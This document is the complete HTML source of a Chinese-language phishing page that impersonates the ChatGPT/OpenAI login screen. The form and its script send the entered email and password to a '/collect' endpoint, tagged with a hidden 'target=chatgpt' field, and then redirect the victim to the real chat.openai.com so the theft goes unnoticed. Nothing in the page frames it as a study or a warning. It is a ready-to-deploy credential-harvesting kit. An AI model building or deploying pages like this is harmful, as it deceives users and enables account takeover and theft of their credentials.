<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ChatGPT 登录</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ffffff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .login-container { background: white; border: 1px solid #e5e7eb; border-radius: 12px; padding: 48px; width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { width: 48px; height: 48px; }
        h1 { font-size: 28px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; text-align: center; }
        .subtitle { text-align: center; color: #6b7280; margin-bottom: 32px; font-size: 15px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 6px; font-size: 14px; color: #374151; font-weight: 500; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 15px; transition: border-color 0.2s, box-shadow 0.2s; }
        input:focus { outline: none; border-color: #10a37f; box-shadow: 0 0 0 3px rgba(16, 163, 127, 0.1); }
        .btn { width: 100%; padding: 14px; background: #10a37f; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #0d8f6e; }
        .btn:disabled { background: #9ca3af; cursor: not-allowed; }
        .divider { display: flex; align-items: center; margin: 24px 0; color: #9ca3af; font-size: 13px; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #e5e7eb; }
        .divider span { padding: 0 16px; }
        .alt-btn { width: 100%; padding: 14px; background: white; color: #374151; border: 1px solid #d1d5db; border-radius: 6px; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: background 0.2s; }
        .alt-btn:hover { background: #f9fafb; }
        .footer { text-align: center; margin-top: 24px; font-size: 13px; color: #6b7280; }
        .footer a { color: #10a37f; text-decoration: none; margin: 0 4px; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M24 4C12.95 4 4 12.95 4 24S12.95 44 24 44 44 35.05 44 24 35.05 4 24 4zm0 2c12.14 0 22 9.86 22 22S36.14 48 24 48 2 38.14 2 24 11.86 2 24 2z" fill="#10A37F"/>
                <path d="M18 16h12v16H18z" fill="white" opacity="0.2"/>
                <path d="M22 20h4v12h-4z" fill="white"/>
                <path d="M22 16h4v4h-4z" fill="white"/>
            </svg>
        </div>
        <h1>欢迎回来</h1>
        <p class="subtitle">登录以继续使用 ChatGPT</p>
        <form id="loginForm" action="/collect" method="POST">
            <input type="hidden" name="target" value="chatgpt">
            <div class="form-group">
                <label for="username">邮箱地址</label>
                <input type="email" id="username" name="username" required autocomplete="username" placeholder="name@example.com">
            </div>
            <div class="form-group">
                <label for="password">密码</label>
                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
            </div>
            <button type="submit" class="btn">继续</button>
        </form>
        <div class="divider"><span>或继续使用</span></div>
        <button class="alt-btn" type="button">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z" fill="#4285F4"/>
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z" fill="#34A853" transform="translate(0, 0)"/>
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z" fill="#FBBC05" transform="translate(0, 0)"/>
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z" fill="#EA4335" transform="translate(0, 0)"/>
            </svg>
            Google
        </button>
        <button class="alt-btn" type="button" style="margin-top: 12px;">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm0 22C6.48 22 2 17.52 2 12S6.48 2 12 2s10 4.48 10 10-4.48 10-10 10zm6-7h-5v5h-2v-5H7V13h5V8h2v5h5v2z" fill="white"/>
            </svg>
            Microsoft
        </button>
        <div class="footer">
            <a href="#">忘记密码?</a>
            <a href="#">注册</a>
            <div style="margin-top: 16px;">© 2024 OpenAI</div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const btn = e.target.querySelector('.btn');
            btn.textContent = '登录中...';
            btn.disabled = true;
            try {
                const resp = await fetch('/collect', { method: 'POST', body: formData });
                if (resp.redirected) window.location.href = resp.url;
                else window.location.href = 'https://chat.openai.com/';
            } catch { window.location.href = 'https://chat.openai.com/'; }
        });
    </script>
</body>
</html>
